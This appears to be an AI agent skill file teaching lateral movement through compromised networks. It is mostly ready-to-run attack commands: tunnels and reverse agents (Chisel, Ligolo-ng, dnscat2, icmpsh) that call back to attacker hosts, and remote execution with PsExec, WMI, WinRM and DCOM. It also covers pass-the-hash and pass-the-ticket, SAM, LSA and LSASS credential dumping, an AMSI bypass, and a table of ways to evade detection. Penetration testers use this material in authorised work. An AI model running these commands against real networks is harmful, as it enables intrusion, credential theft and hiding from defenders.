---
name: lateral_movement
description: Learn network pivoting, SSH tunneling, SOCKS proxies, and techniques to move through compromised networks using Metasploit routing, Chisel, Ligolo-ng, and Windows remoting methods (PsExec, WMI, WinRM, DCOM).
---
# Lateral Movement

## When to Use This Skill

- Moving from a compromised host to other systems in the network
- Accessing internal networks through a pivot point
- Setting up tunnels to route traffic through compromised hosts
- Establishing SOCKS proxies for tool access to internal networks
- Using harvested credentials to access remote systems
- Bypassing network segmentation during assessments

---

## Concepts

### Movement Strategy

1. **Assess position** — Understand network topology, routes, accessible subnets
2. **Select method** — Choose pivoting technique based on access level and detection risk
3. **Establish tunnel** — Create reliable channel to internal network
4. **Enumerate targets** — Discover and assess reachable systems
5. **Move laterally** — Use credentials or exploits to access additional hosts
6. **Maintain access** — Ensure tunnel stability and consider backup paths

### Pivoting vs Lateral Movement

| Concept | Description |
|---------|-------------|
| Pivoting | Using a compromised host to route traffic to otherwise unreachable networks |
| Lateral Movement | Using credentials or exploits to gain access to additional systems |

Both are typically used together: pivot to reach the network, then move laterally within it.

### Detection Considerations

| Technique | Detection Risk | Notes |
|-----------|---------------|-------|
| SSH tunneling | Low | Encrypted, blends with admin traffic |
| Metasploit routing | Medium | Unusual process behavior |
| Ligolo-ng | Low | TUN-based, no proxychains needed |
| Chisel | Low | HTTP/HTTPS tunneling |
| PsExec | High | Creates services, heavy logging |
| WMI | Medium | Admin activity, less artifacts |
| WinRM | Medium | Legitimate admin protocol |
| DCOM | Low-Medium | Less commonly monitored |

---

## Network Pivoting

### SSH Tunneling

SSH tunneling is a fundamental pivoting technique available on any host with SSH access.

**Local Port Forwarding** (-L) — Forward local port to remote target:
```bash
# Access internal web server (192.168.1.10:80) via pivot
ssh -L 8080:192.168.1.10:80 user@pivot_host
# Now browse: http://localhost:8080

# Access internal RDP
ssh -L 3389:192.168.1.10:3389 user@pivot_host
```

**Remote Port Forwarding** (-R) — Expose local service to pivot host:
```bash
# Make local port 4444 accessible from pivot host
ssh -R 4444:localhost:4444 user@pivot_host
# Reverse shell can now connect to pivot_host:4444
```

**Dynamic Port Forwarding** (-D) — Create SOCKS proxy:
```bash
# Create SOCKS5 proxy on local port 1080
ssh -D 1080 user@pivot_host
# Use with proxychains to access entire internal network

# With specific bind address
ssh -D 0.0.0.0:1080 user@pivot_host
```

**Jump Hosts** (-J) — Multi-hop tunneling:
```bash
# SSH through multiple hosts
ssh -J user1@jump1,user2@jump2 user3@target

# Dynamic proxy through chain
ssh -J user@jump1 -D 1080 user@jump2
```

**SSH Config for Complex Pivots**:
```
# ~/.ssh/config
Host pivot
    HostName 10.10.10.10
    User admin
    DynamicForward 1080

Host internal
    HostName 192.168.1.10
    User root
    ProxyJump pivot
```

### Metasploit Pivoting

**Autoroute** — Add routes through meterpreter session:
```
meterpreter > run autoroute -s 192.168.1.0/24
# or
meterpreter > run post/multi/manage/autoroute

# Verify routes
msf6 > route print

# All Metasploit modules now access 192.168.1.0/24 through session
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

**Port Forwarding** (portfwd) — Forward specific ports:
```
# Local forward: access internal service from attacker
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
# Browse http://localhost:8080 to access internal host

# Local forward for RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.10

# Reverse forward: allow internal hosts to reach attacker
meterpreter > portfwd add -R -l 4444 -p 4444 -L 0.0.0.0

# List and manage
meterpreter > portfwd list
meterpreter > portfwd delete -l 8080
meterpreter > portfwd flush
```

**SOCKS Proxy** — Full network access through session:
```
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Configure proxychains (/etc/proxychains4.conf)
# socks4  127.0.0.1 1080

# Use external tools through proxy
proxychains nmap -sT -Pn -n 192.168.1.0/24 --top-ports 50
proxychains crackmapexec smb 192.168.1.0/24
```

**Note**: Proxychains only supports TCP. Use `-sT` (TCP connect) and `-Pn` (no ping) with nmap.

### Ligolo-ng (Recommended for 2024+)

Ligolo-ng creates a TUN interface, eliminating the need for proxychains. Included in Kali 2024.2+.

**Setup on attacker**:
```bash
# Install (if not on Kali 2024.2+)
apt install ligolo-ng

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
ligolo-proxy -selfcert
```

**Agent on compromised host**:
```bash
# Windows
ligolo-agent.exe -connect attacker_ip:11601 -ignore-cert

# Linux
./ligolo-agent -connect attacker_ip:11601 -ignore-cert
```

**Establish tunnel**:
```
# In ligolo-proxy console
ligolo » session                    # Select active session
[Agent] » start                     # Start tunnel

# Add routes on attacker (v0.6+ does this automatically)
sudo ip route add 192.168.1.0/24 dev ligolo
```

**Access internal network directly** (no proxychains!):
```bash
nmap -sS -Pn 192.168.1.0/24
crackmapexec smb 192.168.1.0/24
curl http://192.168.1.10
```

**Double pivoting** — Reach third network:
```
# Deploy second agent on host in 192.168.1.0/24
# Add listener for nested agents
[Agent] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# New agent connects to first agent, appears in proxy
# Add route to third network
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Chisel

HTTP-based tunneling, excellent for restrictive environments.

**Server on attacker**:
```bash
# Standard server
chisel server -p 8080 --reverse

# With SOCKS support
chisel server -p 443 --reverse --socks5
```

**Client on compromised host**:
```bash
# SOCKS proxy (reverse)
chisel client attacker_ip:443 R:socks

# Port forward
chisel client attacker_ip:8080 R:3389:192.168.1.10:3389
```

**Use SOCKS proxy**:
```bash
# Proxy listens on attacker port 1080
proxychains nmap -sT -Pn 192.168.1.0/24
```

### sshuttle

VPN-over-SSH without requiring root on pivot host.

```bash
# Basic usage
sshuttle -r user@pivot_host 192.168.1.0/24

# With key file
sshuttle -r user@pivot_host 192.168.1.0/24 --ssh-cmd 'ssh -i id_rsa'

# Multiple networks
sshuttle -r user@pivot_host 192.168.1.0/24 10.10.10.0/24

# Exclude local network
sshuttle -r user@pivot_host 192.168.1.0/24 -x 192.168.1.1
```

Direct access without proxychains (sshuttle handles routing via iptables).

### socat Relays

Versatile relay tool for port forwarding.

```bash
# Simple port forward
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80

# Bind shell relay
socat TCP-LISTEN:4444,reuseaddr,fork TCP:internal_host:4444

# UDP relay
socat UDP-LISTEN:53,fork UDP:192.168.1.10:53
```

### Protocol Tunneling

**DNS Tunneling with dnscat2**:
```bash
# Server (attacker)
dnscat2-server tunnel.attacker.com

# Client (compromised host)
dnscat2 tunnel.attacker.com
# or
dnscat2 --dns server=attacker_ip,port=53

# In dnscat2 shell
dnscat2> session -i 1
command> shell
```

**ICMP Tunneling with icmpsh**:
```bash
# Disable ICMP replies on attacker
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# Server (attacker)
./icmpsh_m.py attacker_ip target_ip

# Client (Windows target)
icmpsh.exe -t attacker_ip
```

---

## Windows Lateral Movement

### PsExec Methods

Multiple implementations with different trade-offs.

**Metasploit psexec**:
```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.1.10
msf6 > set SMBUser Administrator
msf6 > set SMBPass Password123
# or with hash
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38
msf6 > exploit
```

**Impacket psexec.py**:
```bash
# With password
psexec.py DOMAIN/user:password@192.168.1.10

# With NTLM hash (Pass-the-Hash)
psexec.py -hashes :32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.10

# Execute specific command
psexec.py user:pass@target 'whoami /all'
```

**Impacket smbexec.py** — No file upload, uses service:
```bash
# Less artifacts than psexec
smbexec.py DOMAIN/user:password@192.168.1.10
smbexec.py -hashes :hash Administrator@192.168.1.10
```

### WMI Execution

Semi-interactive, runs as calling user (not SYSTEM), stealthier.

**Impacket wmiexec.py**:
```bash
wmiexec.py DOMAIN/user:password@192.168.1.10
wmiexec.py -hashes :hash user@192.168.1.10

# Specific command
wmiexec.py user:pass@target 'hostname'
```

**Metasploit**:
```
msf6 > use exploit/windows/local/wmi_exec
msf6 > set RHOSTS 192.168.1.10
msf6 > set SMBUser user
msf6 > set SMBPass password
msf6 > exploit
```

**Native (from Windows)**:
```cmd
wmic /node:192.168.1.10 /user:Administrator /password:Pass process call create "cmd.exe /c whoami > C:\output.txt"
```

### WinRM

Windows Remote Management — legitimate admin protocol.

**Evil-WinRM** (recommended):
```bash
# Password authentication
evil-winrm -i 192.168.1.10 -u Administrator -p Password123

# Pass-the-Hash
evil-winrm -i 192.168.1.10 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38

# With SSL
evil-winrm -i 192.168.1.10 -u user -p pass -S

# Kerberos (2024+)
evil-winrm -i dc.domain.local -u user -k --spn HTTP/dc.domain.local
```

**Evil-WinRM features**:
```ruby
*Evil-WinRM* PS> upload /local/file.exe C:\Windows\Temp\file.exe
*Evil-WinRM* PS> download C:\file.txt /local/file.txt
*Evil-WinRM* PS> menu              # Built-in scripts and tools
*Evil-WinRM* PS> Bypass-4MSI       # AMSI bypass
```

**Metasploit**:
```
msf6 > use exploit/windows/winrm/winrm_script_exec
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME user
msf6 > set PASSWORD password
msf6 > exploit
```

**PowerShell Remoting**:
```powershell
# Enter interactive session
Enter-PSSession -ComputerName 192.168.1.10 -Credential domain\user

# Execute command
Invoke-Command -ComputerName 192.168.1.10 -Credential domain\user -ScriptBlock { whoami }

# Execute on multiple hosts
Invoke-Command -ComputerName host1,host2,host3 -ScriptBlock { hostname }
```

### DCOM

Distributed COM — less monitored than other methods.

**Impacket dcomexec.py**:
```bash
# Uses MMC20.Application by default
dcomexec.py DOMAIN/user:password@192.168.1.10

# Specific DCOM object
dcomexec.py -object MMC20 user:pass@target
dcomexec.py -object ShellWindows user:pass@target
dcomexec.py -object ShellBrowserWindow user:pass@target
```

### Scheduled Tasks

**Impacket atexec.py**:
```bash
atexec.py DOMAIN/user:password@192.168.1.10 'whoami'
atexec.py -hashes :hash user@target 'hostname'
```

**Native (from Windows)**:
```cmd
schtasks /create /s 192.168.1.10 /u domain\user /p password /tn "TaskName" /tr "cmd /c whoami > C:\out.txt" /sc once /st 00:00
schtasks /run /s 192.168.1.10 /u domain\user /p password /tn "TaskName"
schtasks /delete /s 192.168.1.10 /u domain\user /p password /tn "TaskName" /f
```

### RDP

**Standard connection**:
```bash
xfreerdp /v:192.168.1.10 /u:Administrator /p:Password123 /dynamic-resolution
```

**Pass-the-Hash** (requires Restricted Admin mode):
```bash
# Enable Restricted Admin if you have other access
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connect with hash
xfreerdp /v:192.168.1.10 /u:Administrator /pth:32196B56FFE6F45E294117B91A83BF38 /dynamic-resolution
```

**Session hijacking** (local admin on target):
```cmd
# List sessions
query user /server:192.168.1.10

# Hijack session (requires SYSTEM)
tscon <session_id> /dest:console
```

### NetExec/CrackMapExec

Swiss army knife for Windows lateral movement.

**Command execution**:
```bash
# Execute command
nxc smb 192.168.1.0/24 -u user -p pass -x 'whoami'

# With hash
nxc smb 192.168.1.10 -u Administrator -H hash -x 'hostname'

# Execute PowerShell
nxc smb 192.168.1.10 -u user -p pass -X 'Get-Process'
```

**Credential spraying and collection**:
```bash
# Spray across network
nxc smb 192.168.1.0/24 -u users.txt -p password --continue-on-success

# Dump SAM
nxc smb 192.168.1.10 -u admin -p pass --sam

# Dump LSA
nxc smb 192.168.1.10 -u admin -p pass --lsa

# Pass-the-Hash spray
nxc smb 192.168.1.0/24 -u Administrator -H hash --local-auth
```

**Modules**:
```bash
# List modules
nxc smb -L

# Credential dumping with lsassy
nxc smb 192.168.1.10 -u admin -p pass -M lsassy

# Create LNK file for hash capture
nxc smb 192.168.1.10 -u user -p pass -M slinky -o NAME=test SERVER=attacker_ip
```

---

## Linux Lateral Movement

### SSH Key Reuse

```bash
# Find SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Check known_hosts for targets
cat ~/.ssh/known_hosts

# Use key
ssh -i /path/to/id_rsa user@target

# Check authorized_keys for patterns
cat ~/.ssh/authorized_keys
```

### Credential Reuse

```bash
# Password reuse
ssh user@target  # Try same password

# Root password reuse
su -
```

### Configuration Management Abuse

**Ansible** — If controller is compromised:
```bash
# Find inventory
find / -name "hosts" -path "*ansible*" 2>/dev/null
cat /etc/ansible/hosts

# Execute ad-hoc command
ansible all -m shell -a 'id'

# Check for playbooks
find / -name "*.yml" -path "*ansible*" 2>/dev/null
```

**Ansible with SSH key access**:
```bash
# Ansible uses SSH, reuse its access
ssh -i ~/.ssh/ansible_key user@managed_host
```

### NFS Exploitation

```bash
# Find NFS exports
showmount -e target

# Mount share
mkdir /mnt/nfs
mount -t nfs target:/share /mnt/nfs

# If no_root_squash is set, create SUID binary
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target: /path/to/bash -p
```

---

## Credential-Based Movement

### Pass-the-Hash

Use NTLM hash without cracking.

```bash
# Impacket tools
psexec.py -hashes :hash user@target
wmiexec.py -hashes :hash user@target
smbexec.py -hashes :hash user@target

# Evil-WinRM
evil-winrm -i target -u user -H hash

# CrackMapExec/NetExec
nxc smb target -u user -H hash -x 'whoami'

# Metasploit
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38
```

### Pass-the-Ticket

Use Kerberos tickets for authentication.

```bash
# Export ticket from memory (on compromised host)
# Using mimikatz: sekurlsa::tickets /export

# Use ticket with Impacket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain/user@target
```

### Overpass-the-Hash

Convert NTLM hash to Kerberos ticket.

```bash
# Get TGT from hash
getTGT.py -hashes :hash domain/user

# Use resulting ticket
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain/user@target
```

---

## Evasion During Movement

### Traffic Patterns

- **Timing**: Spread activity over time, avoid rapid authentication attempts
- **Volume**: Limit concurrent connections to avoid triggering thresholds
- **Protocol**: Use legitimate admin protocols (WinRM, RDP) over unusual ones

### Living Off the Land

Use built-in Windows tools for lateral movement:

```powershell
# PowerShell Remoting
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# WMI (built-in)
wmic /node:target process call create "cmd.exe /c ..."

# PsExec (Sysinternals, commonly installed)
psexec \\target cmd.exe
```

### Avoiding Common Detections

| Technique | Detection | Evasion |
|-----------|-----------|---------|
| PsExec | Service creation events | Use WMI or WinRM instead |
| Mimikatz | LSASS access | Use comsvcs.dll method |
| RDP Brute | Failed logon events | Use Pass-the-Hash with Restricted Admin |
| Port scanning | IDS signatures | Route through legitimate tunnel |

---

## Workflows

### Network Pivot Establishment

1. **Assess network position**:
   ```
   meterpreter > ipconfig
   meterpreter > route
   meterpreter > arp
   ```

2. **Identify target networks**:
   ```
   meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.0.0/16
   ```

3. **Establish pivot** (choose method):
   ```
   # Metasploit autoroute
   meterpreter > run autoroute -s 192.168.1.0/24

   # Or Ligolo-ng for better performance
   # Transfer and run agent
   ```

4. **Configure SOCKS if using external tools**:
   ```
   msf6 > use auxiliary/server/socks_proxy
   msf6 > set SRVPORT 1080
   msf6 > run -j
   ```

5. **Verify access**:
   ```bash
   proxychains nmap -sT -Pn -n 192.168.1.1 -p 22,80,445
   ```

### Windows Domain Lateral Movement

1. **Enumerate network** through pivot:
   ```bash
   proxychains nxc smb 192.168.1.0/24
   ```

2. **Identify targets** with harvested credentials:
   ```bash
   proxychains nxc smb 192.168.1.0/24 -u user -p pass
   # Look for "Pwn3d!" indicating admin access
   ```

3. **Execute on targets**:
   ```bash
   proxychains evil-winrm -i 192.168.1.10 -u admin -p pass
   # or
   proxychains wmiexec.py domain/admin:pass@192.168.1.10
   ```

4. **Harvest additional credentials**:
   ```bash
   proxychains nxc smb 192.168.1.10 -u admin -p pass --sam
   proxychains nxc smb 192.168.1.10 -u admin -p pass -M lsassy
   ```

5. **Repeat** with new credentials on additional targets

### Multi-Hop Pivot (Double Pivot)

1. **First pivot** — Attacker → Host A (DMZ):
   ```
   meterpreter > run autoroute -s 10.10.10.0/24
   ```

2. **Access internal network** through Host A:
   ```
   msf6 > use exploit/windows/smb/psexec
   msf6 > set RHOSTS 10.10.10.5
   msf6 > set SMBUser admin
   msf6 > set SMBPass pass
   msf6 > exploit
   ```

3. **Second pivot** — Add route through Host B:
   ```
   meterpreter > run autoroute -s 172.16.0.0/24
   ```

4. **Access third network** (172.16.0.0/24):
   ```
   msf6 > use auxiliary/scanner/smb/smb_version
   msf6 > set RHOSTS 172.16.0.0/24
   msf6 > run
   ```

**With Ligolo-ng** (cleaner):
```
# Agent on Host A, add listener
[Agent-A] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# Agent on Host B connects to Host A:11601
# Add routes for both networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/24 dev ligolo
```
